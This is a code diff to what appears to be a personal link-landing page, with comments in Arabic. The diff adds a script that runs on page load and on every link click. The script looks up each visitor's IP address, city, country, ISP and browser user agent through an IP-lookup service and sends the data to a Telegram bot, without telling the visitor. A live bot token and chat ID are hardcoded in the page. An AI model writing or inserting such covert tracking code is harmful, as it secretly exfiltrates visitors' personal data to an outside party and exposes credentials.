@@ -32,7 +32,7 @@
             color: white; text-decoration: none; padding: 30px; border-radius: 25px;
             font-size: 28px; font-weight: bold; border: 2px solid #00d2ff;
             display: flex; align-items: center; justify-content: center; gap: 25px;
-            transition: 0.3s; cursor: pointer; border: 2px solid #00d2ff;
+            transition: 0.3s; cursor: pointer;
         }
         .link-btn:hover { background: rgba(0,210,255,0.2); }
         .link-btn i { font-size: 42px; animation: bounceIcon 2s infinite; }
@@ -60,20 +60,34 @@
     </div>
 
     <script>
-        // تنبيه عند فتح الموقع
-        window.onload = function() {
+        // الدالة الموحدة لجلب البيانات وإرسالها للبوت
+        function sendLogToBot(extraMessage) {
             const token = "8822902847:AAH0cwrAwfnY_4qZBc3iUjuH5UY1UDIE17s"; 
             const chatId = "5591628026";
-            const message = "👁️ شخص ما دخل إلى صفحتك الرئيسية الآن!";
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+
+            fetch('https://ip-api.com/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const deviceInfo = navigator.userAgent; 
+                    const message = `${extraMessage}\n\n` +
+                                    `📍 المدينة: ${data.city}\n` +
+                                    `🌐 الدولة: ${data.country}\n` +
+                                    `🏢 مزود الخدمة: ${data.isp}\n` +
+                                    `🔢 IP: ${data.query}\n` +
+                                    `📱 الجهاز: ${deviceInfo}`;
+                    
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+                });
+        }
+
+        // تنبيه عند فتح الموقع
+        window.onload = function() {
+            sendLogToBot("👁️ شخص ما دخل إلى صفحتك الرئيسية الآن!");
         };
 
         // تنبيه عند الضغط على الروابط
         function sendNotification(platform, url) {
-            const token = "8822902847:AAH0cwrAwfnY_4qZBc3iUjuH5UY1UDIE17s"; 
-            const chatId = "5591628026";
-            const message = "🔔 شخص ما ضغط على رابط: " + platform;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+            sendLogToBot("🔔 شخص ما ضغط على رابط: " + platform);
             window.open(url, '_blank');
         }
     </script>
